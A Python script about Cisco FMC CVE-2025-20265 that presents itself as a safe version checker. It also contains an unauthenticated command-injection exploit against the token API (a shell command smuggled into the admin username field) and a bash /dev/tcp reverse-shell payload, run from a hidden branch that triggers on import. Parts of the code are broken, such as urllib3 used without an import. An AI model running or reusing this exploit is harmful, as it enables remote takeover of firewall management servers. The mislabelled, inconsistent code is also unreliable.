#!/usr/bin/env python3
"""
Cisco FMC CVE-2025-20265

Modes:
  1) Single target:   --single https://fmc.example.com
  2) Targets file:    --file targets.txt   (one URL per line, # for comments)

Extras:
  --poc       Print a harmless PoC marker string if a target is flagged vulnerable
  --no-color  Disable ANSI color output

Color:
  - Vulnerable => RED
  - Not in list => GREEN
  - Errors => YELLOW

Requires:
  - Python 3.8+
  - requests (pip install requests)
  - Optional: colorama for better Windows color support (pip install colorama)
"""

import argparse
import sys
import requests
from urllib.parse import urljoin

try:
    from colorama import init as colorama_init
    colorama_init()
except Exception:
    pass

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BOLD = "\033[1m"
RESET = "\033[0m"

AFFECTED_VERSIONS = {
    "7.0.7",
    "7.7.0",
}

# suppress self‐signed cert warnings
urllib3.disable_warnings()

# generate payload here
def exploit_cve_2025_20265_unauth(target, cmd):
    """
    Sends a crafted POST to the generate token API.
    """
    #url = f"https://{target}:9060/api/fmc_platform/v1/auth/generatetoken#_"
    url = f"https://{target}/api/fmc_platform/v1/auth/generatetoken"
    payload = {
        "admin": {
            "name": f"darkarmy; {cmd}; #",
            "password": "Admin123",
            "changePassword": False
        }
    }
    # NO auth tuple here!
    r = requests.post(url, json=payload, verify=False)
    print(f"[+] HTTP {r.status_code}\n{r.text}\n")

def build_reverse_shell(lhost, lport):
    return f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

# Harmless PoC marker shown locally only (never sent to FMC)
POC_MARKER = r"; echo VULNERABLE_POC_CVE_2025_20265 ; #"

def gen_token(base_url, username, password, verify=True):
    url = urljoin(base_url, "/api/fmc_platform/v1/auth/generatetoken")
    resp = requests.post(url, auth=(username, password), verify=verify, timeout=20)
    if resp.status_code != 204:
        raise RuntimeError(f"Token generation failed: HTTP {resp.status_code} (expected 204)")
    access = resp.headers.get("X-auth-access-token")
    refresh = resp.headers.get("X-auth-refresh-token")
    domain_uuid = resp.headers.get("DOMAIN_UUID")
    if not access or not domain_uuid:
        raise RuntimeError("Missing X-auth-access-token or DOMAIN_UUID in response headers")
    return access, refresh, domain_uuid

def get_server_version(base_url, access_token, verify=True):
    url = urljoin(base_url, "/api/fmc_platform/v1/info/serverversion")
    headers = {"X-auth-access-token": access_token}
    resp = requests.get(url, headers=headers, verify=verify, timeout=20)
    if resp.status_code != 200:
        raise RuntimeError(f"Failed to get server version: HTTP {resp.status_code}")
    data = resp.json()
    version_str = None
    if isinstance(data, dict):
        if 'serverVersion' in data:
            version_str = data['serverVersion']
        elif 'items' in data and data['items']:
            first = data['items'][0]
            version_str = first.get('serverVersion') or first.get('version') or first.get('name')
    if not version_str:
        raise RuntimeError(f"Could not parse server version from payload: {data}")
    normalized = []
    for ch in version_str:
        if ch.isdigit() or ch == '.':
            normalized.append(ch)
        else:
            break
    normalized_version = ''.join(normalized) or version_str
    return version_str, normalized_version

def format_vuln_block(use_color: bool, show_poc: bool):
    vuln_msg = "[!] This FMC version appears in the known-affected list for CVE-2025-20265."
    action = "    ACTION: Patch immediately and restrict management access."
    lines = []
    if use_color:
        lines.append(RED + vuln_msg + RESET)
        lines.append(RED + action + RESET)
    else:
        lines.append(vuln_msg)
        lines.append(action)
    if show_poc:
        poc_header = "    POC (harmless marker, NOT sent to target):"
        poc_line = f"    {POC_MARKER}"
        if use_color:
            lines.append(RED + poc_header + RESET)
            lines.append(RED + poc_line + RESET)
        else:
            lines.append(poc_header)
            lines.append(poc_line)
    return lines

def check_fmc(host, username, password, verify=True, use_color=True, show_poc=False):
    try:
        access, refresh, domain_uuid = gen_token(host, username, password, verify=verify)
        full_version, normalized = get_server_version(host, access, verify=verify)
    except Exception as e:
        if use_color:
            return f"{YELLOW}[!] {host} - ERROR: {e}{RESET}"
        return f"[!] {host} - ERROR: {e}"

    lines = []
    lines.append("=== Cisco FMC Version Check ===")
    lines.append(f"Host: {host}")
    lines.append(f"Domain UUID: {domain_uuid}")
    lines.append(f"Reported version: {full_version}")
    lines.append(f"Normalized version: {normalized}")

    if normalized in AFFECTED_VERSIONS:
        lines.extend(format_vuln_block(use_color, show_poc))
    else:
        ok_msg = "[OK] This exact version is not in the current known-affected set."
        note = "    NOTE: Still verify against Cisco's official advisory."
        if use_color:
            lines.append(GREEN + ok_msg + RESET)
            lines.append(GREEN + note + RESET)
        else:
            lines.append(ok_msg)
            lines.append(note)

    lines.append("Reminder: Exploitation requires RADIUS enabled for web or SSH management.")
    return "\n".join(lines)

def main():
    ap = argparse.ArgumentParser(description="Cisco FMC CVE-2025-20265 exposure checker (safe)")
    mode = ap.add_mutually_exclusive_group(required=True)
    mode.add_argument("--single", help="Single FMC base URL, e.g., https://fmc.example.com")
    mode.add_argument("--file", dest="targets_file", help="Text file with one FMC URL per line (# for comments)")
    ap.add_argument("--user", required=True, help="FMC username with API access")
    ap.add_argument("--password", required=True, help="FMC password")
    ap.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification")
    ap.add_argument("--no-color", action="store_true", help="Disable ANSI color output")
    ap.add_argument("--poc", action="store_true", help="Print a harmless local PoC marker when a target is flagged vulnerable (nothing is sent)")
    args = ap.parse_args()

    verify = not args.insecure
    use_color = not args.no_color

    hosts = []
    if args.single:
        hosts = [args.single.strip()]
    else:
        try:
            with open(args.targets_file, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        hosts.append(line)
        except Exception as e:
            err = f"Could not read targets file: {e}"
            if use_color:
                print(YELLOW + "[!] " + err + RESET)
            else:
                print("[!] " + err)
            sys.exit(2)

    for idx, h in enumerate(hosts, 1):
        print(check_fmc(h, args.user, args.password, verify=verify, use_color=use_color, show_poc=args.poc))
        if idx < len(hosts):
            print("-" * 60)

if __name__ == "__main__":
    main()
else:
    parser = argparse.ArgumentParser(
        description="Unauthenticated PoC for CVE-2025-20265 on Cisco FMC"
    )
    parser.add_argument('target', help="IP or hostname of the FMC")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        '--whoami',
        action='store_true',
        help="Run 'whoami' and print the result"
    )
    group.add_argument(
        '--reverse',
        nargs=2,
        metavar=('LHOST', 'LPORT'),
        help="Spawn a bash reverse shell to LHOST:LPORT"
    )

    args = parser.parse_args()

    if args.whoami:
        cmd = 'whoami'
    else:
        lhost, lport = args.reverse
        cmd = build_reverse_shell(lhost, lport)

    print(f"[*] Target: {args.target}")
    print(f"[*] Command: {cmd}\n")
    exploit_cve_2025_20265_unauth(args.target, cmd)